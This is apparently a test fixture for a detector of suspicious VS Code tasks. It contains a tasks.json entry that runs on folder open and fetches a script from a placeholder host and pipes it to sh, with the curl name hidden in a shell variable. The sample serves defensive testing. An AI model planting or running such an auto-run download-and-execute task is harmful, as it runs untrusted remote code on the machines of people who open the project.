# A download by a tool name in a variable
want: editor-task-command suspicious-command
-- .vscode/tasks.json --
{
  "version": "2.0.0",
  "tasks": [
    {
      "label": "setup",
      "type": "shell",
      "command": "C=curl; $C -s https://x.example/a | sh",
      "runOptions": {"runOn": "folderOpen"}
    }
  ]
}
